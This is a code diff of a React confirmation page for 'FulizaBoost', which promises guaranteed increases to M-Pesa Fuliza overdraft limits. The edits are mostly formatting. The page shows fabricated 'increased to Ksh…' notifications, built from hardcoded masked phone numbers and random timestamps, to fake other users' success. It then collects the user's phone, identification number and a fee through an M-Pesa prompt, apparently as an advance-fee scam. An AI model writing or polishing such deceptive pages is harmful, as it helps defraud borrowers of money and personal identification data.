@@ -15,8 +15,7 @@ const notifications = [
   { phone: "0791****89", limit: 45000 },
 ];
 
-
-// Weighted times for realistic notification feel
+// Weighted notification times
 const notificationTimes = [
   { label: "just now", weight: 50 },
   { label: "3 mins ago", weight: 25 },
@@ -25,11 +24,9 @@ const notificationTimes = [
   { label: "10 mins ago", weight: 3 },
 ];
 
-// Helper function to pick weighted random time
 const getRandomTime = () => {
   const totalWeight = notificationTimes.reduce((sum, t) => sum + t.weight, 0);
   let rand = Math.random() * totalWeight;
-
   for (const t of notificationTimes) {
     if (rand < t.weight) return t.label;
     rand -= t.weight;
@@ -40,7 +37,7 @@ const getRandomTime = () => {
 const Confirmation = () => {
   const navigate = useNavigate();
   const { state } = useLocation();
-  const { limit, fee, phone, username,identificationNumber } = state || {};
+  const { limit, fee, phone, username, identificationNumber } = state || {};
 
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState<string | null>(null);
@@ -51,11 +48,10 @@ const Confirmation = () => {
   });
   const [showNotification, setShowNotification] = useState(true);
 
-  // Change notification every 4 seconds with weighted times
+  // Rotate notifications every 4 seconds
   useEffect(() => {
     const interval = setInterval(() => {
       setShowNotification(false);
-
       setTimeout(() => {
         const randomIndex = Math.floor(Math.random() * notifications.length);
         setCurrentNotification({
@@ -87,8 +83,8 @@ const Confirmation = () => {
           body: JSON.stringify({
             phone,
             fee,
-             amount: limit,                          // ✅ send limit as amount
-            identificationNumber: identificationNumber, 
+            amount: limit,
+            identificationNumber,
             customer_name: username,
           }),
         }
@@ -99,7 +95,6 @@ const Confirmation = () => {
 
       if (data.success) {
         setMessage("Payment queued! Check your phone for MPESA prompt.");
-        // Optionally navigate after a delay
         setTimeout(() => navigate("/success"), 2000);
       } else {
         setMessage("Payment failed: " + (data.message || "Try again"));
@@ -125,17 +120,18 @@ const Confirmation = () => {
         <h1 className="title">FulizaBoost</h1>
         <p className="subtitle">Instant Limit Increase • Guaranteed Approval</p>
       </div>
-{/* NOTIFICATION CARD */}
-<div className="notification-card">
-  <div className="notification-overlay ticker">
-    <div className="notification-icon">⚡</div>
-    <div className="notification-content">
-      <strong>{currentNotification.phone}</strong> increased to Ksh{" "}
-      {currentNotification.limit.toLocaleString()}
-      <span className="notification-time"> • {currentNotification.time}</span>
-    </div>
-  </div>
-</div>
+
+      {/* NOTIFICATION CARD */}
+      <div className="notification-card">
+        <div className={`notification-overlay ticker ${showNotification ? "show" : ""}`}>
+          <div className="notification-icon">⚡</div>
+          <div className="notification-content">
+            <strong>{currentNotification.phone}</strong> increased to Ksh{" "}
+            {currentNotification.limit.toLocaleString()}
+            <span className="notification-time"> • {currentNotification.time}</span>
+          </div>
+        </div>
+      </div>
 
       <hr />
 
